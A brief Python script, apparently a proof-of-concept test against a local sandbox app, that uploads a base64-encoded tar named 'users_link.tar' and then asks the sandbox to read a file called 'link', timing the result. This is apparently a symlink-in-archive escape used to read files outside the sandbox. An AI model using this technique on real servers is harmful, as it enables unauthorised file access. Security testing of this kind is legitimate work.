import requests
import base64
import time
def upload_tar(tarfile):
    with open(tarfile, 'rb') as f:
        tar_bytes = f.read()
        tar64 = base64.b64encode(tar_bytes).decode('utf-8')
    url = f"http://localhost:5000/upload"
    response = requests.get(url, params={'tar': tar64}, timeout=60)
    print(f"Upload '{tarfile}' response: {response.status_code} - {response.text[:100]}")

def upload_users_link():
    upload_tar('users_link.tar')


upload_users_link()
r = requests.get('http://localhost:5000/list_users')
start = time.time()
r = requests.get("http://localhost:5000/sandbox?method=read_file&args=link")
end = time.time()
print(len(r.text))
print(r.text[:500])
print(end-start)